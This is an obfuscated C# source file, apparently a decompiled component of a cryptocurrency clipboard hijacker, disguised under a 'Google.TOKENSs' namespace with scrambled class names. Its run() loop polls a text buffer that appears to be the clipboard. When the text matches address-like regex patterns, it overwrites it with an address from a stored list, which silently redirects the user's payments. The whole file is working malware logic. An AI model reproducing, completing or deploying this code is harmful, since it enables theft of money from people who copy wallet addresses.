using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace Google.TOKENSs
{
	internal sealed class A110101010101011
	{
		private static bool INTELVSAMD_changed(string buffer)
		{
			bool flag = buffer != A110101010101011.previous_buffer;
			bool flag2 = flag;
			bool result;
			if (flag2)
			{
				A110101010101011.previous_buffer = buffer;
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}
		private static void replace_INTELVSAMD(string buffer)
		{
			bool flag = string.IsNullOrEmpty(buffer);
			bool flag2 = !flag;
			if (flag2)
			{
				foreach (KeyValuePair<string, Regex> keyValuePair in PUTOELQUELEE.patterns)
				{
					string key = keyValuePair.Key;
					Regex value = keyValuePair.Value;
					bool success = value.Match(buffer).Success;
					bool flag3 = success;
					if (flag3)
					{
						string text = ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.addresses[key];
						bool flag4 = !string.IsNullOrEmpty(text) && !buffer.Equals(text);
						bool flag5 = flag4;
						if (flag5)
						{
							INTELVSAMD.SetText(text);
							break;
						}
					}
				}
			}
		}
		public static void run()
		{
			for (; ; )
			{
				string text = INTELVSAMD.GetText();
				bool flag = A110101010101011.INTELVSAMD_changed(text);
				bool flag2 = flag;
				if (flag2)
				{
					A110101010101011.replace_INTELVSAMD(text);
				}
				Thread.Sleep(ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.INTELVSAMD_check_delay * Convert.ToInt32(1001.0 - Math.Tanh(500.0)));
			}
		}
		private static string previous_buffer = "";
	}
}
